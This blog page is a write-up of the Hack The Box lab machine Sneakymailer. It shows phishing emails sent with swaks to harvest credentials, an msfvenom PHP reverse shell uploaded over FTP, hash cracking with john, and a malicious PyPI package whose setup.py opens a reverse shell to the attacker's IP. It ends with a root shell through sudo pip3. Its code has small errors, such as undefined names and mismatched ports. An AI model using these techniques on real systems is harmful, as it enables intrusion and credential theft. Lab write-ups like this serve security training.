
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="This is a writeup about a retired HacktheBox machine: Sneakymailer publish on July 11, 2020 by sulcud. This box is rated as a medium box. It implies some phishing, an IMAP server, a FTP server, Pypi and sudo." name="description"/>
<meta content="security, boot2root, HTB, linux, phishing, pypi" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="HTB: Sneakymailer" property="og:title"/>
<meta content="This is a writeup about a retired HacktheBox machine: Sneakymailer publish on July 11, 2020 by sulcud. This box is rated as a medium box. It implies some phishing, an IMAP server, a FTP server, Pypi and sudo." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2020/12/htb-sneakymailer.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2020-12-03 07:20:00+01:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="HTB" property="article:tag"/>
<meta content="linux" property="article:tag"/>
<meta content="phishing" property="article:tag"/>
<meta content="pypi" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – HTB: Sneakymailer</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="https://discord.com/users/maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="htb-sneakymailer">HTB: Sneakymailer</h1>
<p>
      Posted on 03 Dec 2020 in <a href="../../category/security.html">security</a>

        • 6 min read
    </p>
</header>
<div>
<p><img alt="Sneakymailer Card" class="align-left" src="/media/2020.12/sneakymailer_card.png" width="262"/></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/262">Sneakymailer</a> publish on
July 11, 2020 by
<a href="https://www.hackthebox.com/home/users/profile/106709">sulcud</a>.
This box is rated as a medium box. It implies some phishing, an IMAP server, a
FTP server, Pypi and sudo.</p>
<h1>Foothold</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Sat Jul 25 03:42:58 2020 as: nmap -p- -sSV -oN nmap 10.10.10.197
Nmap scan report for 10.10.10.197
Host is up (0.079s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     nginx 1.14.2
143/tcp  open  imap     Courier Imapd (released 2018)
993/tcp  open  ssl/imap Courier Imapd (released 2018)
8080/tcp open  http     nginx 1.14.2
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div>
<p>There is a few open ports:</p>
<ul>
<li>21 FTP</li>
<li>22 SSH</li>
<li>25 SMTPD (email)</li>
<li>80 Nginx (web)</li>
<li>143 imap (mail)</li>
<li>993 imap/ssl (mail)</li>
<li>8080 nginx (mail)</li>
</ul>
<h2>Web</h2>
<p>When browsing the website we notice a list of email addresses. We copy them to a
file an use <code>cut -f 4</code> to get a proper list with the email only.</p>
<p>Nothing else on the website seems of interest.</p>
<h2>Phishing</h2>
<p>As the port 25 is open, we can send email to the server.
Our phishing email will contain a simple
link to our machine <code>http://10.10.14.11:8080/test</code>:</p>
<div class="highlight"><pre><span></span><code>Hey try that:

http://10.10.14.11:8000/test

HF
</code></pre></div>
<p>We use <a href="https://github.com/jetmore/swaks">swaks</a>
in order to automatically send our phishing email:</p>
<div class="highlight"><pre><span></span><code>while read l; do swaks --to $l --server 10.10.10.197 --body email; done &lt;emails
</code></pre></div>
<p>We run a <code>netcat</code> listener on port 8080 in order to see the incoming requests and
got some POST request containing a username and a password.</p>
<div class="highlight"><pre><span></span><code>nc -l -p 8000
POST /test%0D HTTP/1.1
Host: 10.10.14.11:8000
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</code></pre></div>
<h2>Evolution</h2>
<p>It took me quit a long time to understand what these credentials where for. But
as the IMAP port is open we can connect to it with a mail client. We launch
evolution (already installed on Kali Linux) and configure it with the previous
information (note that the user is <code>paulbyrd</code>).</p>
<p>We found two emails in the <code>sent</code> directory. The first on contain a password for
the <code>developer</code> account.</p>
<blockquote>
<p>Hello administrator, I want to change this password for the developer account</p>
<p>Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</p>
<p>Please notify me when you do it</p>
</blockquote>
<p>The second one is a address to <code>low</code> and give us some hint about one of the next step.</p>
<blockquote>
<p>Hello low</p>
<p>Your current task is to install, test and then erase every python module you
find in our PyPI service, let me know if you have any inconvenience.</p>
</blockquote>
<h2>FTP</h2>
<p>The <code>developer</code> account credentials allow us to connect to the FTP service. We
see that we can write on the <code>dev</code> folder.</p>
<p>This also take me some time to figure out but we can access our uploaded file on
the <code>dev</code> environment accessible at <a href="http://dev.sneakycorp.htb/test">http://dev.sneakycorp.htb/test</a>.</p>
<p>Therefore we generate a simple PHP <code>meterpreter</code> using <code>msfvenom</code>: <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw &gt; lol.php</code>
and upload it on the FTP server.</p>
<div class="highlight"><pre><span></span><code>write on ftp dev (webshell)
kali@kali:~$ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:kali): developer
331 Please specify the password.
Password:
230 Login successful.
ftp&gt; cd dev
250 Directory successfully changed.
ftp&gt; put lol.php
local: lol.php remote: lol.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
30687 bytes sent in 0.00 secs (7.3772 MB/s)
</code></pre></div>
<p>We run the <code>metasploit</code> handler and trigger our payload by browsing to <a href="http://dev.sneakycorp.htb/lol.php">http://dev.sneakycorp.htb/lol.php</a>.
This get us a shell as <code>www-data</code>.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; getuid
Server username: www-data (33)
</code></pre></div>
<h1>User</h1>
<h2>John</h2>
<p>We browse the file system and found some <code>pypi</code> sub domain and a <code>.htpasswd</code> file
containing an encrypted password.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; ls
Listing: /var/www/pypi.sneakycorp.htb
=====================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  43    fil   2020-05-15 14:29:53 -0400  .htpasswd
40770/rwxrwx---   4096  dir   2020-08-07 07:12:52 -0400  packages
40755/rwxr-xr-x   4096  dir   2020-05-14 18:25:43 -0400  venv

meterpreter &gt; cat .htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
</code></pre></div>
<p>We run <code>john</code> and the <code>rockyou</code> dictionary on it.</p>
<div class="highlight"><pre><span></span><code>$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Use the "--format=md5crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster
Node numbers 1-8 of 8 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
4 0g 0:00:00:05 5.58% (ETA: 14:16:12) 0g/s 19731p/s 19731c/s 19731C/s jeanix..jbhunt
soufianeelhaoui  (pypi)
</code></pre></div>
<h2>PyPi</h2>
<p>This new credentials set allows us to access the <a href="https://pypi.org/">PyPi</a>
server located at
<a href="http://pypi.sneakycorp.htb:8080/">http://pypi.sneakycorp.htb:8080/</a>.</p>
<p>I had never made a Python package, neither use that in order to get a reverse
shell. A read a few <a href="https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56">article about make and uploading package to pypi</a>.</p>
<p>We then construct a specific package with a reverse shell code in <code>setup.py</code>.
The structure of the package is the following.</p>
<div class="highlight"><pre><span></span><code>package
├── build
│   └── lib.linux-x86_64-2.7
│       └── plop
│           ├── __init__.py
│           └── plop.py
├── dist
│   └── plop-0.3.tar.gz
├── LICENSE.txt
├── MANIFEST
├── plop
│   ├── __init__.py
│   └── plop.py
├── plop.egg-info
│   ├── dependency_links.txt
│   ├── PKG-INFO
│   ├── SOURCES.txt
│   └── top_level.txt
├── README
├── setup.cfg
└── setup.py
</code></pre></div>
<p>The code in <code>setup.py</code> is:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">pty</span>
<span class="kn">from</span> <span class="nn">setuptools.command.install</span> <span class="kn">import</span> <span class="n">install</span>
<span class="kn">import</span> <span class="nn">getpass</span>

<span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'http://10.10.14.11:8000/boom'</span><span class="p">)</span>
<span class="k">if</span> <span class="n">getpass</span><span class="o">.</span><span class="n">getuser</span><span class="p">()</span> <span class="o">!=</span> <span class="s1">'kali'</span><span class="p">:</span>
    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">'10.10.14.11'</span><span class="p">,</span><span class="mi">4444</span><span class="p">))</span>
    <span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">)</span>

<span class="n">setup</span><span class="p">(</span>
<span class="n">name</span> <span class="o">=</span> <span class="s1">'plop'</span><span class="p">,</span>         <span class="c1"># How you named your package folder (MyLib)</span>
  <span class="n">packages</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'plop'</span><span class="p">],</span>   <span class="c1"># Chose the same as "name"</span>
  <span class="n">version</span> <span class="o">=</span> <span class="s1">'0.3'</span><span class="p">,</span>      <span class="c1"># Start with a small number and increase it with every change you make</span>
  <span class="n">license</span><span class="o">=</span><span class="s1">'MIT'</span><span class="p">,</span>        <span class="c1"># Chose a license from here: https://help.github.com/articles/licensing-a-repository</span>
  <span class="n">cmdclass</span><span class="o">=</span><span class="p">{</span><span class="s1">'install'</span><span class="p">:</span> <span class="n">CustomInstall</span><span class="p">},</span>
<span class="p">)</span>
</code></pre></div>
<p>We build our package with <code>python setup.py sdist</code> and upload it to the PyPi
server with <code>twine</code>:</p>
<div class="highlight"><pre><span></span><code>twine upload --repository-url http://pypi.sneakycorp.htb:8080/ dist/* --verbose
</code></pre></div>
<p>At the same time we run a <code>netcat</code> listener on our Kali box and wait for the
shell. We then have a shell as <code>low</code> and can access the user flag.</p>
<div class="highlight"><pre><span></span><code>nc -l -p 4444

$ id
id
uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)

$ cat ~/user.txt
cat ~/user.txt
73592699b63e47969c6de934654c2325
</code></pre></div>
<h1>Root</h1>
<p>We put our ssh public key in the <code>.ssh/authorized_keys</code> file and connect to the
box using SSH and run <code>sudo -l</code>. We found that we can run <code>pip3</code> as root without
password.</p>
<div class="highlight"><pre><span></span><code>kali@kali:~$ ssh low@10.10.10.197
low@sneakymailer:~$ sudo -l
^C^C^Csudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
</code></pre></div>
<p>We look at the <a href="https://gtfobins.github.io/gtfobins/pip/#sudo">GTFObins page for pip</a>
and run the commands to create a temporary directory, write a simple <code>setup.py</code>
script executing a shell and installing this "script" as root which give us a
<code>root</code> shell and allow us to read the <code>root</code> flag.</p>
<div class="highlight"><pre><span></span><code>low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.FVBLBZ1NUO
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
3d8f51cb4506c19d77aea84d76e6a846
</code></pre></div>
<h1>Wrapping up</h1>
<p>The root part was really classic and easy. The user part was awesome! I learn so
much on this box and the conception is clearly different from classical boxes as
their is a lot of "interaction" with the "users" (phishing, pypi).</p>
<p>I clearly recommend this box for an "unexpected" journey.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/htb.html">HTB</a>
<a href="../../tag/linux.html">linux</a>
<a href="../../tag/phishing.html">phishing</a>
<a href="../../tag/pypi.html">pypi</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2020/11/htb-buff.html" title="HTB: Buff">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2020/12/htb-openkeys.html" title="HTB: OpenKeyS">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2023  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>